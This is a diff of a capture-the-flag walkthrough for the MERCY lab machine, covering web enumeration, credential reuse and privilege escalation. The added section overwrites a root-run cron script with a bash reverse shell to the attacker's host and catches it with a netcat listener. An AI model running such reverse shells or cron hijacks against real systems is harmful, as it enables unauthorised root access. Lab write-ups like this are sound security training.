@@ -590,38 +590,42 @@ This explains why `80` and `22` showed up as `filtered` in the nmap scan
 Unlock port `80` with `knock -v 10.0.88.35 159 27391 4`
 
 <details>
-  <summary>Nmap reveals 2 paths at <code>/mercy</code> and <code>/nomercy</code></summary>
+  <summary>Enumerate the site with <code>gobuster dir -u http://10.0.88.35 -w /usr/share/dirb/wordlists/common.txt</code>:</summary>
 
 ```console
 ┌──(root㉿kali)-[~]
-└─# nmap -p 80 -A 10.0.88.35
-Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-18 21:44 +08
-Nmap scan report for 10.0.88.35
-Host is up (0.0017s latency).
-
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-|_http-title: Site doesn't have a title (text/html).
-| http-robots.txt: 2 disallowed entries
-|_/mercy /nomercy
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running: Linux 3.X
-OS CPE: cpe:/o:linux:linux_kernel:3.2.0
-OS details: Linux 3.2.0
-Network Distance: 2 hops
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT     ADDRESS
-1   0.39 ms 192.168.17.1
-2   1.31 ms 10.0.88.35
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds
+└─# gobuster dir -u http://10.0.88.35 -w /usr/share/dirb/wordlists/common.txt
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.88.35
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Timeout:                 10s
+===============================================================
+2022/12/20 07:52:02 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 286]
+/.hta                 (Status: 403) [Size: 281]
+/.htaccess            (Status: 403) [Size: 286]
+/index.html           (Status: 200) [Size: 90]
+/robots.txt           (Status: 200) [Size: 50]
+/server-status        (Status: 403) [Size: 290]
+/time                 (Status: 200) [Size: 79]
+Progress: 4614 / 4615 (99.98%)===============================================================
+2022/12/20 07:52:04 Finished
+===============================================================
 ```
 
 </details>
+
+2 interesting items found:
+1. The `/time` page is a time check which reports the system's time - **this can be useful later**
+2. The `robots.txt` file reveals 2 paths at `/mercy` and `/nomercy`
 
 `/mercy` holds a troll message, while `/nomercy` leads to the `RIPS` static code scanning tool
 
@@ -653,6 +657,10 @@ Retrieving the file with `curl -L http://10.0.88.35/nomercy/windows/code.php?fil
 32 <? <user username="fluffy" password="freakishfluffybunny" roles="none"/>
 ⋮
 ```
+
+`thisisasuperduperlonguser` user looks like a way in with the Tomcat manager
+
+`fluffy` doesn't have any roles on Tomcat, but a password is listed - **this can be useful later**
 
 # 5. Getting a reverse shell from tomcat
 
@@ -694,3 +702,133 @@ cat /local.txt
 Plz have mercy on me! :-( :-(
 ```
 
+There isn't much doable with the tomcat7 user, but recall that there was a password found for `fluffy` previously, let's `su` to it:
+
+```console
+tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
+su fluffy
+Password: freakishfluffybunny
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+fluffy@MERCY:/var/lib/tomcat7$ whoami
+whoami
+fluffy
+fluffy@MERCY:/var/lib/tomcat7$ id
+id
+uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
+```
+
+<details>
+  <summary>Listing the home directory of <code>fluffy</code> reveals a <code>timeclock</code> script owned by <code>root</code> that is writeable by <code>fluffy</code></summary>
+
+```console
+fluffy@MERCY:/var/lib/tomcat7$ cd ~
+cd ~
+fluffy@MERCY:~$ ls -lRa
+ls -lRa
+.:
+total 16
+drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 .
+drwxr-xr-x 6 root   root   4096 Nov 20  2018 ..
+-rw------- 1 fluffy fluffy  322 Dec 20 08:16 .bash_history
+drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .private
+
+./.private:
+total 12
+drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .
+drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 ..
+drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 secrets
+
+./.private/secrets:
+total 20
+drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
+drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
+-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
+-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
+-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
+fluffy@MERCY:~$ cat .private/secrets/backup.save
+cat .private/secrets/backup.save
+#!/bin/bash
+
+echo Backing Up Files;
+
+fluffy@MERCY:~$ cat .private/secrets/.secrets
+cat .private/secrets/.secrets
+Try harder!
+fluffy@MERCY:~$ cat .private/secrets/timeclock
+cat .private/secrets/timeclock
+#!/bin/bash
+
+now=$(date)
+echo "The system time is: $now." > ../../../../../var/www/html/time
+echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
+chown www-data:www-data ../../../../../var/www/html/time
+```
+
+</details>
+
+It looks like there should be a cron job that runs this `timeclock` script as `root` to update the `/time` page
+
+Let's replace this with a reverse shell to get a root shell the next time this script runs
+
+```console
+fluffy@MERCY:~$ echo "bash -i >& /dev/tcp/kali.vx/4445 0>&1" > .private/secrets/timeclock
+echo "bash -i >& /dev/tcp/kali.vx/4445 0>&1" > .private/secrets/timeclock
+fluffy@MERCY:~$ cat .private/secrets/timeclock
+cat .private/secrets/timeclock
+bash -i >& /dev/tcp/192.168.17.10/4445 0>&1
+```
+
+Start listener in kali: `rlwrap nc -nlvp 4445` and wait for the script to run
+
+And... we have root shell:
+
+```console
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.35] 43744
+bash: cannot set terminal process group (13203): Inappropriate ioctl for device
+bash: no job control in this shell
+root@MERCY:~#
+```
+
+Going for the `proof.txt`
+
+```console
+root@MERCY:~# find / -name proof.txt
+find / -name proof.txt
+/root/proof.txt
+root@MERCY:~# cat proof.txt
+cat proof.txt
+Congratulations on rooting MERCY. :-)
+```
+
+Looking back: there is indeed a cron job running under `root` that updates the `/time` page and `configprint` in `qiu`'s directory
+
+```console
+root@MERCY:~# crontab -l
+crontab -l
+# Edit this file to introduce tasks to be run by cron.
+#
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+#
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').#
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+#
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+#
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+#
+# For more information see the manual pages of crontab(5) and cron(8)
+#
+# m h  dom mon dow   command
+
+*/3 * * * * bash /home/fluffy/.private/secrets/timeclock
+*/5 * * * * bash /home/qiu/.private/opensesame/configprint
+```
